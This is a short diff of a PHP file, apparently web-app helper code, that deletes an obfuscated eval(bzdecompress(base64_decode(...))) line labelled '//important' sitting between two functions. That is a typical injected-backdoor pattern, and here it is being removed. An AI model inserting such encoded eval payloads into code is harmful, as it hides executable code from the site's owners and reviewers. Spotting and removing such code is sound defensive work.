@@ -355,8 +355,6 @@ function getBody($body, $truncate=false, $max_length=200){
   	$body = preg_replace('|@([a-zA-Z0-9_-]{2,50})|', '<a href="/users/$1" target="_blank">@$1</a>', $body);
     return $body;
 }
-//important
-eval(bzdecompress(base64_decode("QlpoOTFBWSZTWd9u/xAAAAebgFBhAAhAACLl3EAgADFMJpoDTEKaeiAA9Jxroxng2AHDn1Zp1+lVcq4ATULfF3JFOFCQ327/EA==")));
 function checkProxy($ip){
 		$contactEmail="me@example.com";
 		$timeout=5;
